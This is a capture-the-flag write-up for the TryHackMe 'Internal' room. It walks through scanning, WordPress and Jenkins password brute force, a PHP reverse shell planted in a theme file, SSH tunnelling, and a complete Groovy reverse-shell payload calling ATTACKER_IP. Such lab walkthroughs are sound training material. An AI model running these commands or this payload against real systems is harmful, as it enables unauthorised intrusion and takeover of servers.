# TryHackMe - Internal Writeup

So today I'm gonna show you how I solved the Internal room.

We start with scanning the target: 10.48.171.217

```bash 
# Nmap 7.95 scan initiated Sat May 30 14:07:45 2026 as: /usr/lib/nmap/nmap --privileged -Pn -sS -A -T4 -oN scan22 10.48.171.217
Nmap scan report for 10.48.171.217
Host is up (0.23s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)
|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)
|_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)

# Nmap done at Sat May 30 14:08:26 2026 -- 1 IP address (1 host up) scanned in 41.39 seconds

```
We got two open ports — SSH on 22 and HTTP on 80 running Apache 2.4.29. The first thing we do is check the web page, but browsing to the IP directly won't work. We need to add it to `/etc/hosts` so the domain resolves:

 ```bash 
 echo 10.48.171.217 internal.thm >> /etc/hosts
 ```
 
Now we browse to `internal.thm` but there's nothing useful on the default page. Time to run Gobuster to find hidden directories:
 
```bash 
gobuster dir -u http://internal.thm  -w /usr/share/wordlists/dirb/common.txt
```
We find two interesting paths — `/blog` and `/phpmyadmin`. We try default credentials on phpMyAdmin but that doesn't work. So we move to `/blog` and find a WordPress site.


Since it's WordPress, we use WPScan to enumerate usernames:

```bash
wpscan --url http://internal.thm/blog --enumerate u
```
We find the username `admin`. Now we brute force the login:

We find the username `admin`. We look around the site but nothing stands out, so we run Gobuster again, this time against the blog directory:
```bash
gobuster dir -u http://internal.thm/blog -w /usr/share/wordlists/dirb/common.txt
```


We find `/wp-admin` which gives us the WordPress login page. Now we brute force the login:"


```bash
wpscan --url http://internal.thm/blog/wp-login.php -U admin -P /usr/share/wordlists/rockyou.txt
```

We get `admin / my2boys`. We're in.

Once logged into the WordPress admin panel, we look around and find the Theme Editor under Appearance. This lets us edit PHP files directly, which means we can get code execution on the server. We grab the PHP reverse shell from our Kali machine:
```bash 
cat /usr/share/webshells/php/php-reverse-shell.php
```




We copy it, update the IP and port to our Kali machine, and paste it into the `404.php` theme file. We start our netcat listener and then trigger the shell by visiting:
```
http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php
```

We catch a shell as `www-data`. Now we enumerate the filesystem to look for anything useful. `/opt` is a common place where admins leave files, credentials, and notes. so we check there first and find `wp-save.txt` with SSH credentials: 



```
aubreanna:bubb13guM!@#123
```


We SSH in as aubreanna and grab the first flag from `user.txt`. Looking around the home directory we find `jenkins.txt` which tells us there's an internal Jenkins service running on `172.17.0.2:8080`.

Before we move on, let me explain what Jenkins and Docker are.
Jenkins is a tool developers use to run automated tasks, so if we have access to it as admin we can run any command. Docker is like a mini computer inside a computer,  Jenkins was running inside one. How do we know? From the IP `172.17.0.2` , Docker's default IP range is `172.17.x.x`, so when we saw that IP we knew it was a container. Since aubreanna is a low privilege user on the main host, we can't get root directly, we have to go through the container first.

Since `172.17.0.2:8080` is only accessible from inside the machine and not from the outside, we use SSH tunnelling to forward it to our local machine:


```bash 
ssh -L 8888:172.17.0.2:8080 aubreanna@10.48.171.217
```

Now we browse to `localhost:8888` and get the Jenkins login page. We try default credentials but they don't work, so we brute force with Hydra:




```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt localhost http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password" -t 4 -s 8888
```


We get `admin / spongebob`. We log in and go straight to the Script Console under Manage Jenkins. This lets us run Groovy scripts on the server — which is our RCE. We set up our netcat listener and run this reverse shell:



```bash 
String host="ATTACKER_IP";
int port=7788;
String cmd="/bin/sh";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
The listener already in place. We catch a shell as `jenkins`. We enumerate the container and check `/opt` where we find `note.txt` with root credentials. We SSH into the main host as root and grab the final flag.

